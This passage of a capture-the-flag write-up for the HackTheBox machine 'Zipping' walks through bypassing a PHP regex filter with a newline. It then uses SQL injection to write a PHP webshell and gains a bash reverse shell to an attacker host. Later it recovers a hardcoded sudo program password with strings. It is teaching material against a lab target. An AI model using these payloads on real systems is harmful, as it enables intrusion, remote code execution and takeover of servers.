        <span class="err">$</span><span class="n">stmt</span><span class="o">-&gt;</span><span class="n">execute</span><span class="p">();</span>
        <span class="o">//</span> <span class="n">Fetch</span> <span class="n">the</span> <span class="n">product</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">database</span> <span class="ow">and</span> <span class="k">return</span> <span class="n">the</span> <span class="n">result</span> <span class="k">as</span> <span class="n">an</span> <span class="n">Array</span>
        <span class="err">$</span><span class="n">product</span> <span class="o">=</span> <span class="err">$</span><span class="n">stmt</span><span class="o">-&gt;</span><span class="n">fetch</span><span class="p">(</span><span class="n">PDO</span><span class="p">::</span><span class="n">FETCH_ASSOC</span><span class="p">);</span>
        <span class="o">//</span> <span class="n">Check</span> <span class="k">if</span> <span class="n">the</span> <span class="n">product</span> <span class="n">exists</span> <span class="p">(</span><span class="n">array</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">empty</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="err">!$</span><span class="n">product</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">//</span> <span class="n">Simple</span> <span class="n">error</span> <span class="n">to</span> <span class="n">display</span> <span class="k">if</span> <span class="n">the</span> <span class="nb">id</span> <span class="k">for</span> <span class="n">the</span> <span class="n">product</span> <span class="n">doesn</span><span class="s1">'t exists (array is empty)</span>
            <span class="n">exit</span><span class="p">(</span><span class="s1">'Product does not exist!'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="o">//</span> <span class="n">Simple</span> <span class="n">error</span> <span class="n">to</span> <span class="n">display</span> <span class="k">if</span> <span class="n">the</span> <span class="nb">id</span> <span class="n">wasn</span><span class="s1">'t specified</span>
    <span class="n">exit</span><span class="p">(</span><span class="s1">'No ID provided!'</span><span class="p">);</span>
<span class="p">}</span>
<span class="err">?</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="err">?</span><span class="o">=</span><span class="n">template_header</span><span class="p">(</span><span class="s1">'Zipping | Product'</span><span class="p">)</span><span class="err">?</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"product content-wrapper"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s2">"assets/imgs/&lt;?=$product['img']?&gt;"</span> <span class="n">width</span><span class="o">=</span><span class="s2">"500"</span> <span class="n">height</span><span class="o">=</span><span class="s2">"500"</span> <span class="n">alt</span><span class="o">=</span><span class="s2">"&lt;?=$product['name']?&gt;"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">div</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">h1</span> <span class="n">class</span><span class="o">=</span><span class="s2">"name"</span><span class="o">&gt;&lt;</span><span class="err">?</span><span class="o">=</span><span class="err">$</span><span class="n">product</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span><span class="err">?</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">span</span> <span class="n">class</span><span class="o">=</span><span class="s2">"price"</span><span class="o">&gt;</span>
            <span class="o">&amp;</span><span class="n">dollar</span><span class="p">;</span><span class="o">&lt;</span><span class="err">?</span><span class="o">=</span><span class="err">$</span><span class="n">product</span><span class="p">[</span><span class="s1">'price'</span><span class="p">]</span><span class="err">?</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="n">product</span><span class="p">[</span><span class="s1">'rrp'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span> <span class="err">?</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="n">span</span> <span class="n">class</span><span class="o">=</span><span class="s2">"rrp"</span><span class="o">&gt;&amp;</span><span class="n">dollar</span><span class="p">;</span><span class="o">&lt;</span><span class="err">?</span><span class="o">=</span><span class="err">$</span><span class="n">product</span><span class="p">[</span><span class="s1">'rrp'</span><span class="p">]</span><span class="err">?</span><span class="o">&gt;&lt;/</span><span class="n">span</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">endif</span><span class="p">;</span> <span class="err">?</span><span class="o">&gt;</span>
        <span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">form</span> <span class="n">action</span><span class="o">=</span><span class="s2">"index.php?page=cart"</span> <span class="n">method</span><span class="o">=</span><span class="s2">"post"</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"number"</span> <span class="n">name</span><span class="o">=</span><span class="s2">"quantity"</span> <span class="n">value</span><span class="o">=</span><span class="s2">"1"</span> <span class="nb">min</span><span class="o">=</span><span class="s2">"1"</span> <span class="nb">max</span><span class="o">=</span><span class="s2">"&lt;?=$product['quantity']?&gt;"</span> <span class="n">placeholder</span><span class="o">=</span><span class="s2">"Quantity"</span> <span class="n">required</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="n">name</span><span class="o">=</span><span class="s2">"product_id"</span> <span class="n">value</span><span class="o">=</span><span class="s2">"&lt;?=$product['id']?&gt;"</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="n">value</span><span class="o">=</span><span class="s2">"Add To Cart"</span><span class="o">&gt;</span>
        <span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"description"</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="err">?</span><span class="o">=</span><span class="err">$</span><span class="n">product</span><span class="p">[</span><span class="s1">'desc'</span><span class="p">]</span><span class="err">?</span><span class="o">&gt;</span>
        <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="err">?</span><span class="o">=</span><span class="n">template_footer</span><span class="p">()</span><span class="err">?</span><span class="o">&gt;</span>
</pre></div>

This part of the code is the most interesting:<br/><br/>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="c1">// Check to make sure the id parameter is specified in the URL</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
    <span class="c1">// Filtering user input for letters or special characters</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^.*[A-Za-z!#$%^&amp;*()\-_=+{}\[\]</span><span class="se">\\</span><span class="s2">|;:'</span><span class="se">\"</span><span class="s2">,.&lt;&gt;\/?]|[^0-9]$/"</span><span class="p">,</span> <span class="nv">$id</span><span class="p">,</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: index.php'</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// Prepare statement and execute, but does not prevent SQL injection</span>
        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM products WHERE id = '</span><span class="si">$id</span><span class="s2">'"</span><span class="p">);</span>
        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
        <span class="c1">// Fetch the product from the database and return the result as an Array</span>
        <span class="nv">$product</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
        <span class="c1">// Check if the product exists (array is not empty)</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$product</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Simple error to display if the id for the product doesn't exists (array is empty)</span>
            <span class="k">exit</span><span class="p">(</span><span class="s1">'Product does not exist!'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">// Simple error to display if the id wasn't specified</span>
    <span class="k">exit</span><span class="p">(</span><span class="s1">'No ID provided!'</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></div>

There are comments regarding SQL Injection, and after examining the code, it seems vulnerable <em>(upon inspecting the <code>cart.php</code> file, I noticed that it is also vulnerable via the <code>product_id</code> POST parameter)</em>.<br/><br/>
Let's understand what this code does. Initially, it checks whether the GET <code>id</code> parameter is set. If it is, the data specified in the parameter will be saved in the <code>id</code> variable.<br/><br/>
After that, it checks if it starts with a character other than a literal number. In that case, it will redirect us to <code>index.php</code>.<br/><br/>
This regex seems to be employed to prevent SQL Injection, but there are some considerations to bear in mind.<br/><br/>
At this point, it selects all values from the 'products' table where the 'id' column matches the data specified in the <code>id</code> parameter.<br/><br/>
<div class="highlight"><pre><span></span><span class="x">$stmt = $pdo-&gt;prepare("SELECT * FROM products WHERE id = '$id'");</span>
</pre></div>

If we were able to input malicious queries into the <code>id</code> parameter, there would be potential for exploiting SQL Injection. However, first, we need to understand how to bypass the regex checks.<br/><br/>
After researching on the internet, I found interesting techniques for bypassing <code>preg_match</code> checks on <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match">HackTricks</a>.<br/><br/>
<em>"When delimiting the start of the regexp <code>preg_match()</code> </em><em>only checks the first line of the user input</em><em>, then if somehow you can </em><em>send</em><em> the input in </em><em>several lines</em><em>, you could be able to bypass this check."</em><br/><br/>
This is similar to CRLF injection, but in this case, we only need to use the <code>LineFeed</code> character.<br/><br/>
I'll intercept all requests with Burp Suite and conduct tests to explore potential exploits for this vulnerability<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/12.png"/><br/><br/>
The URL-encoded linefeed character is <code>%0A</code>, which is important to note as we are passing data through the URL.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/13.png"/><br/><br/>
I'll explain this query:<br/><br/>
<div class="highlight"><pre><span></span>%0A'%3bselect+'test'+%231
</pre></div>

First, we specify a linefeed in URL encoding. Following that, I add a single quote to close the previous query. The <code>%3b</code> character represents the <code>;</code>, indicating that the previous query has ended, allowing the start of another query. I then input the <code>select 'test'</code> query (solely for testing purposes, as it won't be displayed in the response). Finally, I comment out the remaining part of the query using <code>%23</code>, which corresponds to the <code>#</code> character in URL decoding. It's important to note that a literal number must be specified to satisfy the regex checks required by the queries.<br/><br/>
As we aren't seeing the output in the response, we need to use techniques like Conditional Error or Time-Based SQL Injection. Although this makes exploitation more challenging, it's not a problem.<br/><br/>
However, revisiting the code we've already examined, in the <code>index.php</code> file, it includes <code>.php</code> files specified through the <code>page</code> parameter. Therefore, if we could write files on the victim machine through SQL Injection, we could inject malicious PHP code, given that it is loaded using the <code>include</code> function.<br/><br/>
Next, I will attempt to write the file <code>/dev/shm/pwned.php</code> with the content <code>&lt;?php echo shell_exec('id'); ?&gt;</code>.This PHP code will output the result of the <code>id</code> command if it gets interpreted.<br/><br/>
The query will be as follows:<br/><br/>
<div class="highlight"><pre><span></span>%0A'%3bselect+'&lt;?php+echo+shell_exec("id");+?&gt;'+into+outfile+'/dev/shm/pwned.php'+%231
</pre></div>

We can verify whether we have successfully written the file using the file reading vulnerability we identified earlier:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">pwned</span><span class="o">.</span><span class="n">php</span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="n">shell_exec</span><span class="p">(</span><span class="s2">"id"</span><span class="p">);</span> <span class="err">?</span><span class="o">&gt;</span>
</pre></div>

It has been written successfully. Therefore, if we manage to load this file through the <code>page</code> parameter of the <code>index.php</code> file, we should observe the output of the <code>id</code> command.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/14.png"/><br/><br/>
We have successfully exploited the SQL injection to achieve Remote Code Execution (RCE) through file writing and exploiting the <code>include</code> function.<br/><br/>
<h3><br>Shell as rektsu</br></h3><br>
To write a webshell, we can use the following query:<br/><br/>
<div class="highlight"><pre><span></span>%0A'%3bselect+'&lt;?php+echo+shell_exec($_GET["cmd"]);+?&gt;'+into+outfile+'/dev/shm/webshell.php'+%231
</pre></div>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/15.png"/><br/><br/>
Now, we can access the webshell through the following URL:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.229</span><span class="o">/</span><span class="n">shop</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">webshell</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">whoami</span>
</pre></div>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/16.png"/><br/><br/>
Now, to obtain a reverse shell, I will create a malicious <code>index.html</code> file containing a <code>bash reverse shell</code>.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">index</span><span class="o">.</span><span class="n">html</span>
<span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.10.16.5</span><span class="o">/</span><span class="mi">3001</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
</pre></div>

Firstly I will create an HTTP server to host the <code>index.html</code> file:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
</pre></div>

Now, I will set up my netcat listener on port 3001 to receive the reverse shell:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span><span class="n">SVN</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
</pre></div>

Now, I will send the following payload:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/17.png"/><br/><br/>
We received the <code>GET</code> request for our <code>index.html</code> file:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
<span class="mf">10.10.11.229</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">12</span><span class="o">/</span><span class="n">Jan</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">18</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="s2">"GET / HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
</pre></div>

Finally, we have gained access to the system as <code>rektsu</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span><span class="n">SVN</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.229</span><span class="p">:</span><span class="mf">35478.</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">1127</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shop</span><span class="err">$</span>
</pre></div>

Now, we will simply adjust the TTY to interact more comfortably with the system:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shop</span><span class="err">$</span>  <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
<span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">output</span> <span class="n">log</span> <span class="n">file</span> <span class="ow">is</span> <span class="s1">'/dev/null'</span><span class="o">.</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shop</span><span class="err">$</span>  <span class="o">^</span><span class="n">Z</span>
<span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>

<span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
                               <span class="n">reset</span>
<span class="n">reset</span><span class="p">:</span> <span class="n">unknown</span> <span class="n">terminal</span> <span class="nb">type</span> <span class="n">unknown</span>
<span class="n">Terminal</span> <span class="nb">type</span><span class="err">?</span> <span class="n">xterm</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shop</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shop</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shop</span><span class="err">$</span>
</pre></div>
<h3><br>Shell as root</br></h3><br>
As rektsu, we do not belong to any interesting groups:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="err">$</span> <span class="nb">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">rektsu</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">rektsu</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">rektsu</span><span class="p">)</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="err">$</span>
</pre></div>

Upon inspecting our sudoers privileges, we noticed that we can execute the program <code>/usr/bin/stock</code> as any user in the system:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
<span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">rektsu</span> <span class="n">on</span> <span class="n">zipping</span><span class="p">:</span>
    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span>
    <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="nb">bin</span>

<span class="n">User</span> <span class="n">rektsu</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">zipping</span><span class="p">:</span>
    <span class="p">(</span><span class="n">ALL</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">stock</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="err">$</span>
</pre></div>

When executing it, it prompt us for a password:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">stock</span>
<span class="n">Enter</span> <span class="n">the</span> <span class="n">password</span><span class="p">:</span> <span class="n">a</span>
<span class="n">Invalid</span> <span class="n">password</span><span class="p">,</span> <span class="n">please</span> <span class="k">try</span> <span class="n">again</span><span class="o">.</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="err">$</span>
</pre></div>

I'm not familiar with it, but perhaps we could perform reverse engineering to recover the program's source code (though it may not be necessary for this machine).<br/><br/>
Perhaps we can retrieve the password using the <code>strings</code> command (which prints all readable characters from the binary):<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="err">$</span> <span class="n">strings</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">stock</span>
<span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span>
<span class="n">mgUa</span>
<span class="n">fgets</span>
<span class="n">stdin</span>
<span class="n">puts</span>
<span class="n">exit</span>
<span class="n">fopen</span>
<span class="n">__libc_start_main</span>
<span class="n">fprintf</span>
<span class="n">dlopen</span>
<span class="n">__isoc99_fscanf</span>
<span class="n">__cxa_finalize</span>
<span class="n">strchr</span>
<span class="n">fclose</span>
<span class="n">__isoc99_scanf</span>
<span class="n">strcmp</span>
<span class="n">__errno_location</span>
<span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span>
<span class="n">GLIBC_2</span><span class="mf">.7</span>
<span class="n">GLIBC_2</span><span class="mf">.2.5</span>
<span class="n">GLIBC_2</span><span class="mf">.34</span>
<span class="n">_ITM_deregisterTMCloneTable</span>
<span class="n">__gmon_start__</span>
<span class="n">_ITM_registerTMCloneTable</span>
<span class="n">PTE1</span>
<span class="n">u</span><span class="o">+</span><span class="n">UH</span>
<span class="n">Hakaize</span>
<span class="n">St0ckM4nager</span>
<span class="o">/</span><span class="n">root</span><span class="o">/.</span><span class="n">stock</span><span class="o">.</span><span class="n">csv</span>
<span class="n">Enter</span> <span class="n">the</span> <span class="n">password</span><span class="p">:</span> 
<span class="n">Invalid</span> <span class="n">password</span><span class="p">,</span> <span class="n">please</span> <span class="k">try</span> <span class="n">again</span><span class="o">.</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">...............</span>
<span class="o">.</span><span class="n">text</span>
<span class="o">.</span><span class="n">fini</span>
<span class="o">.</span><span class="n">rodata</span>
<span class="o">.</span><span class="n">eh_frame_hdr</span>
<span class="o">.</span><span class="n">eh_frame</span>
<span class="o">.</span><span class="n">init_array</span>
<span class="o">.</span><span class="n">fini_array</span>
<span class="o">.</span><span class="n">dynamic</span>
<span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">plt</span>
<span class="o">.</span><span class="n">data</span>
<span class="o">.</span><span class="n">bss</span>
<span class="o">.</span><span class="n">comment</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="err">$</span>
</pre></div>

In the command output, there is an interesting string we can highlight: <code>St0ckM4nager</code>. It seems to be a password, so we could attempt to use it to execute the program.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">stock</span>
<span class="n">Enter</span> <span class="n">the</span> <span class="n">password</span><span class="p">:</span> <span class="n">St0ckM4nager</span>

<span class="o">==================</span> <span class="n">Menu</span> <span class="o">==================</span>

<span class="mi">1</span><span class="p">)</span> <span class="n">See</span> <span class="n">the</span> <span class="n">stock</span>
<span class="mi">2</span><span class="p">)</span> <span class="n">Edit</span> <span class="n">the</span> <span class="n">stock</span>
<span class="mi">3</span><span class="p">)</span> <span class="n">Exit</span> <span class="n">the</span> <span class="n">program</span>

<span class="n">Select</span> <span class="n">an</span> <span class="n">option</span><span class="p">:</span> <span class="mi">3</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="err">$</span>
</pre></div>

